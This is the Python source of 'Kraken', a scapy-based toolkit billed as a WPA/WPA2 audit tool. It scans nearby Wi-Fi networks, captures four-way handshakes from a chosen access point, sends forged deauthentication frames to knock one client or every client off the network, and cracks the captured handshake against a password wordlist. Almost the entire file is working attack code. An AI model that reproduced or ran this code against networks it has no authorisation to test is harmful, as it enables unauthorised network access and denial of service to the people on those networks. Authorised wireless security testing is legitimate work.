"""
MIT License

Copyright (c) 2026 0xf0xy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from scapy.all import (
    sniff,
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11Deauth,
    EAPOL,
    RadioTap,
    sendp,
    Packet,
)
from .utils import (
    RED,
    GREEN,
    YELLOW,
    RESET,
    check_password,
    channel_hopper,
    get_encryption,
    display_dump,
)
from concurrent.futures import ProcessPoolExecutor, as_completed
import subprocess
import time
import json
import os


class Kraken:
    """
    Kraken: WPA/WPA2 audit toolkit.
    """

    def __init__(self):
        """
        Initialize Kraken instance.
        """

    @staticmethod
    def dump_networks(iface: str, target_bssid: str = None, channel: int = None):
        """
        Sniff Wi-Fi networks and display their details. If a target BSSID and channel are provided,
        it will sniff for WPA/WPA2 handshakes.

        Args:
            iface (str): Network interface to sniff on.
            target_bssid (str): BSSID of the target access point.
            channel (int): Channel to monitor for handshakes.
        """
        if target_bssid and channel:
            handshake = {}
            clients = set()

            subprocess.run(
                ["iw", iface, "set", "channel", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            def handshake_handler(pkt: Packet):
                updated = False

                if (
                    pkt.haslayer(Dot11Beacon)
                    and not handshake.get("SSID")
                    and pkt.addr2 == target_bssid
                ):
                    ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
                    handshake["SSID"] = ssid if ssid else "<hidden>"
                    updated = True

                elif pkt.haslayer(EAPOL):
                    src = pkt.addr2 if pkt.addr2 else ""
                    dst = pkt.addr1 if pkt.addr1 else ""

                    if target_bssid not in [src, dst]:
                        return

                    try:
                        raw = bytes(pkt.getlayer(EAPOL))

                    except:
                        return

                    if src == target_bssid and not handshake.get("ANonce"):
                        handshake["AP"] = src
                        handshake["Client"] = dst
                        handshake["ANonce"] = raw.hex()[34:98]
                        updated = True

                    elif (
                        dst == target_bssid
                        and src == handshake.get("Client")
                        and handshake.get("ANonce")
                        and not handshake.get("SNonce")
                    ):
                        handshake["SNonce"] = raw.hex()[34:98]
                        handshake["MIC"] = raw.hex()[162:194]
                        handshake["EAPOL"] = raw.hex()
                        updated = True

                elif pkt.haslayer(Dot11) and pkt.type == 2 and len(clients) < 5:
                    src = pkt.addr2 or ""
                    dst = pkt.addr1 or ""
                    bssid = pkt.addr3 or ""

                    client_mac = None
                    if (
                        target_bssid.lower() == src.lower()
                        and dst.upper() != "FF:FF:FF:FF:FF:FF"
                    ):
                        client_mac = dst.upper()
                    elif (
                        target_bssid.lower() == dst.lower()
                        and src.upper() != "FF:FF:FF:FF:FF:FF"
                    ):
                        client_mac = src.upper()
                    elif target_bssid.lower() == bssid.lower():
                        if (
                            src.upper() != target_bssid.upper()
                            and src.upper() != "FF:FF:FF:FF:FF:FF"
                        ):
                            client_mac = src.upper()
                        elif (
                            dst.upper() != target_bssid.upper()
                            and dst.upper() != "FF:FF:FF:FF:FF:FF"
                        ):
                            client_mac = dst.upper()

                    if client_mac:
                        clients.add(client_mac)
                        updated = True

                if updated:
                    display_dump(
                        "handshake",
                        handshake,
                        bssid=target_bssid,
                        channel=channel,
                        clients=list(clients),
                    )

            sniff(
                iface=iface,
                prn=handshake_handler,
                stop_filter=lambda pkt: all(
                    handshake.get(k) for k in ["ANonce", "SNonce", "MIC", "EAPOL"]
                ),
            )

            with open("handshake.json", "w") as f:
                json.dump(handshake, f, indent=2)

        else:
            networks = {}

            def handler(pkt: Packet):
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[Dot11].addr2.upper()
                    ssid = (
                        pkt[Dot11Elt].info.decode(errors="ignore")
                        if pkt.haslayer(Dot11Elt)
                        else ""
                    )

                    try:
                        dbm_signal = pkt.dBm_AntSignal

                    except:
                        dbm_signal = "N/A"

                    channel = None
                    elt = pkt.getlayer(Dot11Elt)

                    while elt:
                        if elt.ID == 3:
                            channel = elt.info[0]
                            break

                        elt = elt.payload.getlayer(Dot11Elt)

                    encryption = get_encryption(pkt)

                    if bssid not in networks:
                        networks[bssid] = {
                            "ssid": ssid,
                            "signal": dbm_signal,
                            "channel": channel if channel else "-",
                            "encryption": encryption,
                            "beacons": 1,
                        }

                    else:
                        networks[bssid]["signal"] = dbm_signal
                        networks[bssid]["beacons"] += 1

                if networks:
                    display_dump("scan", networks)

            channel_hopper(iface, 0.25)
            sniff(iface=iface, prn=handler)

    @staticmethod
    def deauth(iface: str, target_bssid: str, client: str, pkts: int):
        """
        Send deauthentication packets to a target client or broadcast.

        Args:
            iface (str): Network interface to send packets on.
            target_bssid (str): BSSID of the target access point.
            client (str): MAC address of the target client. If empty, it will target all clients (broadcast).
            pkts (int): Number of deauth packets to send.
        """
        os.system("clear")

        print(f"{YELLOW}Don't use deauth on broadcast to capture handshakes.{RESET}")
        print(f"{YELLOW}It can cause multiple reconnections, generating invalid handshakes.{RESET}\n\n")

        if client:
            client.upper()

        else:
            client = "FF:FF:FF:FF:FF:FF"

        print(f"Sending deauth to '{client}' | AP: {target_bssid.upper()}")
        print("─" * 70)

        dot11 = Dot11(
            type=0,
            subtype=12,
            addr1=client,
            addr2=target_bssid,
            addr3=target_bssid,
        )
        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)

        for i in range(1, pkts + 1):
            sendp(pkt, iface=iface, verbose=0)
            print(f"    --→ Sent {i}/{pkts} deauth packets", end="\r", flush=True)

        print(f"    [{GREEN}✓{RESET}] ")

    @staticmethod
    def crack_handshake(wordlist: str, handshake: str):
        """
        Crack WPA/WPA2 handshake using a wordlist.

        Args:
            wordlist (str): Path to the wordlist file.
            handshake (str): Path to the handshake file.
        """
        os.system("clear")

        with open(handshake, "r") as f:
            handshake_info = json.load(f)

        SSID = handshake_info["SSID"].encode("utf-8")
        AP = bytes.fromhex(handshake_info["AP"].replace(":", ""))
        Client = bytes.fromhex(handshake_info["Client"].replace(":", ""))
        ANonce = bytes.fromhex(handshake_info["ANonce"])
        SNonce = bytes.fromhex(handshake_info["SNonce"])
        MIC = bytes.fromhex(handshake_info["MIC"])
        EAPOL = bytes.fromhex(handshake_info["EAPOL"])

        with open(wordlist, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"Target     : {handshake_info['SSID']} ({handshake_info['AP'].upper()})")
        print(f"Wordlist   : {wordlist}")
        print("─" * 50)

        found = None
        start = time.time()
        keys_tested = 0

        with ProcessPoolExecutor() as executor:
            futures = {
                executor.submit(
                    check_password,
                    pwd,
                    SSID,
                    AP,
                    Client,
                    ANonce,
                    SNonce,
                    MIC,
                    EAPOL,
                ): pwd
                for pwd in passwords
            }

            for future in as_completed(futures):
                pwd = futures[future]
                result = future.result()
                keys_tested += 1
                elapsed = time.time() - start
                speed = keys_tested / elapsed if elapsed > 0 else 0

                print(f"\n    Testing    : {pwd}")
                print(f"\n    Keys tried : {keys_tested}")
                print(f"    Speed      : {int(speed)} keys/sec")
                print(
                    f"    Elapsed    : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}\n"
                )
                print("\033[F\033[K" * 7, end="")

                if result:
                    found = result
                    break

        if found:
            print(f"\n[{GREEN}✓{RESET}] Key Found! → {GREEN}{found}{RESET}")
            print(
                f"\n    Elapsed    : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"
            )

        else:
            print(f"\n    [{RED}x{RESET}] No Key Found.")
